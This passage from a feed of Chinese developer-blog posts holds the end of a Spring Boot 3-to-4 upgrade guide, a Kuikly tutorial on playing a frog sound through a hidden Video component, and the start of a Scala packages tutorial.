    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">layers</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">enabled</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">enabled</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 启用分层 JAR --&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">layers</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>
</code></pre>
<h2 data-id="heading-26">八、总结</h2>
<p>从 Spring Boot 3 升级到 4，主要就是这几个步骤：</p>
<ol>
<li><strong>检查环境</strong>：JDK 版本、当前 Spring Boot 版本</li>
<li><strong>备份代码</strong>：用 Git 创建分支，或者备份文件</li>
<li><strong>升级依赖</strong>：更新 Spring Boot 版本，检查第三方依赖</li>
<li><strong>修改代码</strong>：替换废弃的 API，迁移配置属性</li>
<li><strong>测试验证</strong>：编译、启动、功能测试</li>
<li><strong>优化配置</strong>：启用虚拟线程，使用原生镜像等</li>
</ol>
<p>升级这事儿得慢慢来，别着急；遇到问题就查文档，或者看看日志提示。升级完了，性能提升还是挺明显的，特别是虚拟线程和原生镜像这两个特性，值得一试。反正鹏磊觉得这升级还是挺值的。</p>
<p>好了，今天就聊到这；下一篇咱详细说说 JDK 17+ 最低要求与 Java 21 推荐配置，包括怎么选择 JDK 版本，以及各个版本的特性。兄弟们有啥问题可以在评论区留言，鹏磊看到会回复的。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Kuikly基础之音频播放与资源管理：青蛙叫声实现]]></title>    <link>https://juejin.cn/post/7575884229524930596</link>    <guid>https://juejin.cn/post/7575884229524930596</guid>    <pubDate>2025-11-24T03:28:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575884229524930596" data-draft-id="7575937594350370859" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Kuikly基础之音频播放与资源管理：青蛙叫声实现"/> <meta itemprop="keywords" content="Android,iOS,HarmonyOS"/> <meta itemprop="datePublished" content="2025-11-24T03:28:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="在下历飞雨"/> <meta itemprop="url" content="https://juejin.cn/user/1559379316800"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Kuikly基础之音频播放与资源管理：青蛙叫声实现
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1559379316800/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    在下历飞雨
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:28:19.000Z" title="Mon Nov 24 2025 03:28:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在上一篇文章中，我们成功地让青蛙对我们的点击做出了视觉上的响应——一个生动的缩放动画。现在，我们的应用不再是静态的了，但似乎还缺点什么。</p>
<p>没错，就是声音！交互不仅仅是视觉上的，听觉上的反馈同样重要。如果每次点击青蛙，它都能发出一声清脆的“呱”，那应用的趣味性和沉浸感无疑会更上一层楼。</p>
<p>今天，我们就来完成这个任务：为我们的“单身青蛙”应用加上音效，让它在被点击时，能真实地“叫”出来。同时，我们也会探讨在Kuikly中如何进行基础的音频资源管理。</p>
<h2 data-id="heading-0">初步计划</h2>
<p>在动手之前，我们自然是先去翻了翻Kuikly的文档，想找找有没有现成的音频播放组件，比如一个叫<code>&lt;Audio&gt;</code>的家伙。结果发现，似乎并没有这样一个专门为播放短音效而生的轮子。</p>
<p>不过，没有“直路”，我们可以“绕路”走嘛。Kuikly提供了一个功能强大的<code>&lt;Video&gt;</code>组件。既然视频能包含声音，我们是不是可以利用它来只播放声音呢？这个想法听起来不错。</p>
<p>我们的计划是：准备一个音频文件（就是我们之前准备好的<code>frog_sound.mp3</code>），然后把它“伪装”成一个视频源交给<code>&lt;Video&gt;</code>组件。为了不让它在界面上“碍眼”，我们再把它设置成一个1x1像素的、完全透明的“隐形”播放器。</p>
<h3 data-id="heading-1">实战</h3>
<p>好了，理论有了，开干！</p>
<p>我们最初的想法很简单直接：既然拿到了<code>&lt;Video&gt;</code>组件的引用（<code>ViewRef</code>），那在点击事件里直接调用它的<code>play()</code>方法不就行了？就像这样：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 理想中的代码...</span>
ctx.soundPlayerRef.view?.play() 
</code></pre>
<p>然而，现实很快给了我们一拳，编译器无情地报错：<code>Unresolved reference: play</code>。好吧，看来此路不通。这种命令式的、直接操作视图的方式，似乎并不符合Kuikly的“口味”。</p>
<p>这次碰壁让我们冷静下来，重新思考Kuikly的设计哲学——声明式UI。我们不应该去“命令”一个组件去播放，而应该“声明”它的状态是“正在播放”。</p>
<p>于是，新的方案诞生了：</p>
<ol>
<li>定义一个<code>observable</code>的状态变量 <code>soundPlayControl</code>，用来控制播放行为（播放/暂停）。</li>
<li>将<code>&lt;Video&gt;</code>组件的<code>playControl</code>属性绑定到这个状态上。</li>
<li>当用户点击青蛙时，我们不再调用方法，而是去更新<code>soundPlayControl</code>的状态为<code>VideoPlayControl.PLAY</code>。</li>
<li>监听<code>&lt;Video&gt;</code>的<code>playStateDidChanged</code>事件，当播放结束（状态变为<code>PlayState.PLAY_END</code>）时，再将<code>soundPlayControl</code>的状态改回<code>VideoPlayControl.PAUSE</code>，为下一次播放做准备。</li>
</ol>
<p>这个思路听起来就“地道”多了！它完美地融入了整个应用的响应式数据流。</p>
<h3 data-id="heading-2">最终代码</h3>
<p>说干就干，我们立刻对<code>FrogMainPage.kt</code>进行了改造，最终的代码如下：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ... 省略部分import ...</span>
<span class="hljs-keyword">import</span> com.tencent.kuikly.core.base.ViewRef
<span class="hljs-keyword">import</span> com.tencent.kuikly.core.views.PlayState
<span class="hljs-keyword">import</span> com.tencent.kuikly.core.views.Video
<span class="hljs-keyword">import</span> com.tencent.kuikly.core.views.VideoPlayControl
<span class="hljs-keyword">import</span> com.tencent.kuikly.core.views.VideoView

<span class="hljs-comment">// ...</span>

<span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FrogMainPage</span> : <span class="hljs-type">BasePager</span>() {

    <span class="hljs-comment">// ... 省略其他状态变量 ...</span>
    <span class="hljs-keyword">lateinit</span> <span class="hljs-keyword">var</span> soundPlayerRef: ViewRef&lt;VideoView&gt;
    <span class="hljs-comment">// 新增一个控制音频播放的状态</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> soundPlayControl: VideoPlayControl <span class="hljs-keyword">by</span> observable(VideoPlayControl.PAUSE)

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">body</span><span class="hljs-params">()</span></span>: ViewBuilder {
        <span class="hljs-keyword">val</span> ctx = <span class="hljs-keyword">this</span>
        <span class="hljs-keyword">return</span> {
            <span class="hljs-comment">// ... 省略大部分UI布局 ...</span>
            
                        <span class="hljs-comment">// 主青蛙按钮</span>
                        View {
                            <span class="hljs-comment">// ... 省略部分 attr ...</span>
                            event {
                                 click {
                                     <span class="hljs-comment">// ... 省略其他点击事件逻辑 ...</span>
                                     
                                     <span class="hljs-comment">// 更新状态，触发音频播放</span>
                                     <span class="hljs-keyword">this</span><span class="hljs-symbol">@FrogMainPage</span>.soundPlayControl = VideoPlayControl.PLAY
                                 }
                             }
                        }
            
            <span class="hljs-comment">// ... 省略部分UI布局 ...</span>

                <span class="hljs-comment">// “隐形”的音频播放器</span>
                Video {
                    ref {
                        ctx.soundPlayerRef = it
                    }
                    attr {
                        src(<span class="hljs-string">"media/frog_sound.mp3"</span>)
                        width(<span class="hljs-number">1f</span>)
                        height(<span class="hljs-number">1f</span>)
                        opacity(<span class="hljs-number">0f</span>)
                        <span class="hljs-comment">// 将播放行为和我们的状态绑定</span>
                        playControl(<span class="hljs-keyword">this</span><span class="hljs-symbol">@FrogMainPage</span>.soundPlayControl)
                    }
                    event {
                        <span class="hljs-comment">// 监听播放状态</span>
                        playStateDidChanged { state, _ -&gt;
                            <span class="hljs-comment">// 播放结束后，重置状态以便下次播放</span>
                            <span class="hljs-keyword">if</span> (state == PlayState.PLAY_END) {
                                <span class="hljs-keyword">this</span><span class="hljs-symbol">@FrogMainPage</span>.soundPlayControl = VideoPlayControl.PAUSE
                            }
                        }
                    }
                }
                
            <span class="hljs-comment">// ... 省略底部功能区 ...</span>
        }
    }
    
    <span class="hljs-comment">// ... 省略生命周期方法 ...</span>
}
</code></pre>
<p>代码解释：</p>
<ol>
<li><strong><code>soundPlayControl</code>状态</strong>：我们新增了一个<code>observable</code>变量，它的类型是<code>VideoPlayControl</code>，默认值为<code>PAUSE</code>。</li>
<li><strong>状态更新触发播放</strong>：在青蛙的<code>click</code>事件中，我们不再调用任何方法，而是简单地将<code>soundPlayControl</code>的值改为<code>VideoPlayControl.PLAY</code>。</li>
<li><strong>属性绑定</strong>：<code>&lt;Video&gt;</code>组件的<code>playControl</code>属性直接绑定了<code>soundPlayControl</code>状态。当状态改变时，Kuikly框架会自动更新组件，从而控制视频（音频）的播放或暂停。</li>
<li><strong>播放后重置状态</strong>：我们监听<code>playStateDidChanged</code>事件。在探索中我们发现，当播放完成时，状态会变为<code>PlayState.PLAY_END</code>。此时，我们把<code>soundPlayControl</code>重新设置为<code>PAUSE</code>，这样就完成了一个播放循环，并且可以让青蛙被连续点击发声。</li>
</ol>
<h2 data-id="heading-3">结语</h2>
<p>现在，重新编译运行，再次点击那只青蛙。伴随着熟悉的缩放动画，一声清脆的“呱”终于响了起来！虽然中间走了点小弯路，但我们最终还是用一种更“Kuikly”的方式，让我们的应用“活”了起来。这次的经历也让我们对Kuikly的声明式思想有了更深的理解：少一些命令，多一些声明，代码会变得更优雅、更可预测。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[包及其导入]]></title>    <link>https://juejin.cn/post/7575469988737957897</link>    <guid>https://juejin.cn/post/7575469988737957897</guid>    <pubDate>2025-11-24T03:31:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575469988737957897" data-draft-id="7575469988737744905" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="包及其导入"/> <meta itemprop="keywords" content="前端,后端"/> <meta itemprop="datePublished" content="2025-11-24T03:31:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="谁黑皮谁肘击谁在连累直升机"/> <meta itemprop="url" content="https://juejin.cn/user/2763534402854203"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            包及其导入
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2763534402854203/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    谁黑皮谁肘击谁在连累直升机
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:31:55.000Z" title="Mon Nov 24 2025 03:31:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、Scala 包（Package）的概念及使用</h2>
<p>Scala 的包（Package）本质与 Java 包一致，核心作用是 <strong>组织代码结构、避免类 / 特质 / 方法的命名冲突</strong>，同时支持访问控制（控制代码的可见性）。但 Scala 对包的语法进行了增强，比 Java 更灵活（如嵌套包、包对象、包前缀简化等）。</p>
<h3 data-id="heading-1">1. 包的核心概念</h3>
<ul>
<li>
<p><strong>本质</strong>：一个 “命名空间”（Namespace），用于将相关的类（Class）、特质（Trait）、对象（Object）、函数（Function）等代码元素分组管理。</p>
</li>
<li>
<p><strong>命名规范</strong>：通常遵循 “反向域名” 规则（与 Java 一致），例如 <code>com.company.project.module</code>，全小写字母，用 <code>.</code> 分隔层级。</p>
</li>
<li>
<p><strong>核心作用</strong>：</p>
<ol>
<li>避免命名冲突（不同包下可存在同名类，如 <code>com.a.User</code> 和 <code>com.b.User</code>）；</li>
<li>模块化管理代码（按功能拆分，如 <code>controller</code>、<code>service</code>、<code>model</code> 包）；</li>
<li>控制访问权限（通过 <code>private</code>、<code>protected</code> 等关键字限制包外访问）。</li>
</ol>
</li>
</ul>
<h3 data-id="heading-2">2. 包的定义与目录结构</h3>
<p>Scala 包的定义必须与 <strong>文件系统目录结构一致</strong>（否则编译器无法找到代码），这一点和 Java 完全相同。</p>
<h4 data-id="heading-3">（1）基础定义方式（与 Java 类似）</h4>
<p>通过 <code>package</code> 关键字声明包，放在文件最顶部，一个文件只能声明一个 “主包”（但可嵌套子包）。</p>
<h5 data-id="heading-4">示例：目录结构与包声明对应</h5>
<p>plaintext</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">src</span>/<span class="hljs-selector-tag">main</span>/<span class="hljs-selector-tag">scala</span>/          <span class="hljs-comment">// Scala 源代码根目录</span>
└── <span class="hljs-selector-tag">com</span>/
    └── <span class="hljs-selector-tag">example</span>/
        ├── <span class="hljs-selector-tag">model</span>/       <span class="hljs-comment">// 子包：存储数据模型</span>
        │   └── <span class="hljs-selector-tag">User</span><span class="hljs-selector-class">.scala</span>
        └── <span class="hljs-selector-tag">service</span>/     <span class="hljs-comment">// 子包：存储业务逻辑</span>
            └── <span class="hljs-selector-tag">UserService</span><span class="hljs-selector-class">.scala</span>
</code></pre>
<h5 data-id="heading-5">代码示例：<code>User.scala</code>（数据模型）</h5>
<p>scala</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 包声明：对应目录 com/example/model</span>
<span class="hljs-keyword">package</span> com.example.model

<span class="hljs-comment">// 包内定义类（默认访问权限：包可见）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-keyword">val</span> name: String, <span class="hljs-keyword">val</span> age: <span class="hljs-built_in">Int</span>) {
  <span class="hljs-keyword">override</span> def toString: String = s<span class="hljs-string">"User(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>)"</span>
}

<span class="hljs-comment">// 包内定义对象（单例）</span>
<span class="hljs-keyword">object</span> User {
  <span class="hljs-comment">// 工厂方法：创建 User 实例</span>
  def apply(name: String, age: <span class="hljs-built_in">Int</span>): User = new User(name, age)
}
</code></pre>
<h5 data-id="heading-6">代码示例：<code>UserService.scala</code>（业务逻辑）</h5>
<p>scala</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 包声明：对应目录 com/example/service</span>
package com.example.service

<span class="hljs-comment">// 导入其他包的类（与 Java 类似，用 import）</span>
<span class="hljs-keyword">import</span> com.example.model.User

<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
  <span class="hljs-comment">// 业务方法：查询用户</span>
  <span class="hljs-function">def <span class="hljs-title">findUser</span><span class="hljs-params">(name: <span class="hljs-type">String</span>)</span>: User =</span> <span class="hljs-built_in">User</span>(name, <span class="hljs-number">20</span>)
}
</code></pre>
<h4 data-id="heading-7">（2）Scala 增强：嵌套包（Nested Package）</h4>
<p>Scala 支持在一个文件中定义嵌套包，无需创建多层目录（但仍建议目录与包结构一致，保证可读性）。</p>
<h5 data-id="heading-8">示例：嵌套包定义</h5>
<p>scala</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 外层包</span>
<span class="hljs-keyword">package</span> com.example {
  <span class="hljs-comment">// 子包 model（嵌套在 com.example 下）</span>
  <span class="hljs-keyword">package</span> model {
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-keyword">val</span> name: String)
  }

  <span class="hljs-comment">// 子包 service（嵌套在 com.example 下）</span>
  <span class="hljs-keyword">package</span> service {
    <span class="hljs-keyword">import</span> model.User  <span class="hljs-comment">// 嵌套包内可直接导入同级子包，无需写全路径</span>
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
      def getUser: User = new User(<span class="hljs-string">"Alice"</span>)
    }
  }
}
</code></pre>
<h5 data-id="heading-9">注意：</h5>
<ul>
<li>嵌套包的访问规则：内层包可直接访问外层包的元素（无需导入），外层包不能直接访问内层包（需显式导入）；</li>
<li>实际开发中，嵌套包多用于 “内部工具类” 或 “关联性极强的代码”，避免过度嵌套导致可读性下降。</li>
</ul>
<h4 data-id="heading-10">（3）Scala 专属：包对象（Package Object）</h4>
<p>Scala 不允许在包内直接定义函数 / 变量（Java 也不允许），但提供 <strong>包对象（Package Object）</strong>  来解决这个问题 —— 包对象是对应包的 “全局工具容器”，可定义全局函数、变量、隐式转换等，包内所有代码可直接访问。</p>
<h5 data-id="heading-11">包对象的定义规则：</h5>
<ul>
<li>包对象必须与对应包同名，且放在该包的 “父包” 下；</li>
<li>文件名固定为 <code>package.scala</code>（编译器会自动识别）。</li>
</ul>
<h5 data-id="heading-12">示例：定义包对象</h5>
<p>scala</p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-comment">// 目录：com/example/package.scala（父包是 com，对应包是 example）</span>
<span class="hljs-keyword">package</span> com  <span class="hljs-comment">// 父包</span>

